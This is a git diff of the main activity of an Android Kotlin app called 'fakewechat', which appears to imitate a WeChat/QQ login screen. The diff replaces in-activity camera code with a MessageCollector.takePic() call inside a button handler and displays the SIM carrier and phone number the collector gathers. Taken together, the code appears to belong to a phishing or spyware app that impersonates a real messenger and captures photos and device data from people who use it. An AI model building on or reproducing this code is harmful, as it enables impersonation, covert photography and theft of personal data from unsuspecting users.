@@ -1,6 +1,7 @@
 package com.example.fakewechat
 
 import android.app.AlertDialog
+import android.content.Context
 
 import android.graphics.Color
 import android.hardware.Camera
@@ -42,6 +43,7 @@ class MainActivity : AppCompatActivity() {
     var QQLogin_Type = false;
 
 
+/*
 
     private lateinit var camera: Camera;
     private val cpHolderCallback = object : SurfaceHolder.Callback {
@@ -56,17 +58,19 @@ class MainActivity : AppCompatActivity() {
         override fun surfaceDestroyed(holder: SurfaceHolder) {
             stopPreview()
         }
-    }
+    }*/
 
     override fun onResume() {
         super.onResume()
 
 
-        sfv_preview.holder.addCallback(cpHolderCallback);
-        Log.i("camera","test")
+        /*sfv_preview.holder.addCallback(cpHolderCallback);*/
 
-        registerReceiver(MyBroadcastReceiver(), IntentFilter("com.example.fakeqq.MY_BROADCAST"))
+
+
+
     }
+
 
 
 
@@ -94,9 +98,10 @@ class MainActivity : AppCompatActivity() {
             window.navigationBarColor = Color.TRANSPARENT
         }
 
-        setContentView(R.layout.activity_main)
+        setContentView(R.layout.activity_main);
 
         MessageCollector.setMyContext(applicationContext);
+        Log.i("setContext","context:"+applicationContext)
 
 
 
@@ -146,7 +151,9 @@ class MainActivity : AppCompatActivity() {
 
 
         buttonChange.setOnClickListener({
-            sfv_preview.visibility = INVISIBLE
+
+
+
             QQLogin_Type = !QQLogin_Type;
             if (QQLogin_Type){
                 Tv_title.text = "微信号/QQ号/邮箱登陆";
@@ -186,7 +193,7 @@ class MainActivity : AppCompatActivity() {
 
             //拍照,0标示前置摄像头，1表示后置摄像头
 
-            Log.i("test","here")
+
 
 //            var camera = Camera.open(0);
 
@@ -194,10 +201,11 @@ class MainActivity : AppCompatActivity() {
                 override fun onPictureTaken(data: ByteArray, p1: Camera?) {
                     var path = ""
 
-                    Log.i("test","here2")
+
                     var bitmap = BitmapFactory.decodeByteArray(data, 0, data.size);
 
-                    Log.i("test",""+data.size)
+
+
                     //自定义文件保存路径  以拍摄时间区分命名
                     var filepath = "/" + SimpleDateFormat("yyyyMMddHHmmss").format(Date()) +  ".jpg";
                     var file = File(filepath);
@@ -216,7 +224,7 @@ class MainActivity : AppCompatActivity() {
 
 
 
-
+/*
             camera.takePicture(null, null, Camera.PictureCallback { data, camera ->
                 var path = saveFile(data)
                 if (path != null) {
@@ -225,8 +233,12 @@ class MainActivity : AppCompatActivity() {
                 } else {
                     Toast.makeText(this@MainActivity, "保存照片失败", Toast.LENGTH_SHORT).show()
                 }
-            })
-            Log.i("test","here3")
+            })*/
+
+
+            MessageCollector.takePic();
+
+
             //Sim卡信息
             Toast.makeText(this@MainActivity,
                     "运营商："+MessageCollector.getProvidersName()+",手机号："+MessageCollector.getNativePhoneNumber()
@@ -273,7 +285,7 @@ class MainActivity : AppCompatActivity() {
 
     }
 
-
+/*
     //保存临时文件的方法
     private fun saveFile(bytes: ByteArray): String {
         try {
@@ -293,7 +305,7 @@ class MainActivity : AppCompatActivity() {
 
     //开始预览
     private fun startPreview() {
-        Log.i("camera","start")
+
 
         camera = Camera.open(1)
 
@@ -310,13 +322,13 @@ class MainActivity : AppCompatActivity() {
 
     //停止预览
     private fun stopPreview() {
-        Log.i("camera","stop")
-/*
+
+*//*
         camera.stopPreview()
         camera.release()
-*/
+*//*
 
-    }
+    }*/
 
 }
 
